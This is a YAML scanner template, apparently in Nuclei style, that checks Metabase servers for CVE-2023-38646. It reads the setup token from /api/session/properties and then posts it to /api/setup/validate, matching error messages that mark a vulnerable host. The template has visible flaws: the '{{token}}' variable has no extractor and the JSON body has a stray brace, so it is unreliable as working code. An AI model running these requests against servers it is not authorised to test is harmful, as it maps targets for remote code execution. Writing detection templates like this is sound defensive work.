id: yaml-poc-metabase-metabase-rce-CVE-2023-38646
info:
  name: Yaml Poc Metabase Metabase Rce Cve 2023 38646
  author: yiqing.xu
  severity: critical
  description: 'Converted from xpoc: yaml-poc-metabase-metabase-rce-CVE-2023-38646'
  tags: rce,cve
  classification:
    cve-id: CVE-2023-38646
  reference:
  - http://packetstormsecurity.com/files/174091/Metabase-Remote-Code-Execution.html
  - https://github.com/metabase/metabase/issues/32552
  - https://github.com/metabase/metabase/releases/tag/v0.46.6.1
  - https://news.ycombinator.com/item?id=36812256
  - https://www.metabase.com/blog/security-advisory
http:
- method: GET
  path:
  - /api/session/properties
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - setup-token
- method: POST
  path:
  - /api/setup/validate
  body: '{"token":"{{token}}","details":{"is_on_demand":false,"is_full_sync":false,"is_sample":false,"cache_ttl":null,"refingerprint":true,"auto_run_queries":true,"schedules":{},"details":{},"name":"test","engine":"mysql"}}}'
  headers:
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - Instance already initialized
    - Could not connect to address
